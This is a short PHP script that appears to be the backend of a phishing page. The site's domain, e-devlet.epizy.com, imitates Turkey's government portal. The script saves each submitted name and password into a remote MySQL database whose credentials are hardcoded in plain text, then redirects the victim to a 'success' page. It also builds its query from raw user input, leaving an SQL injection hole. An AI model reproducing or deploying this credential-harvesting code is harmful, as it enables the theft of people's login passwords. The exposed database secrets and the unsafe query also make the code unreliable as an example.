
<?php
$con=mysqli_connect("sql110.epizy.com","epiz_31575988","1fDktjMzedjI","epiz_31575988_uyeislemleri") or die("Hata");

$ad=$_POST['ad'];
$parola=$_POST['parola'];



$sql="insert into veri(ad,parola) values('$ad','$parola')";
$res=mysqli_query($con,$sql);

if ($res)
    echo header("Location:http://e-devlet.epizy.com/basarili.html");
else
    echo "Bilgiler kaydedilemedi.";
mysqli_close($con);

?>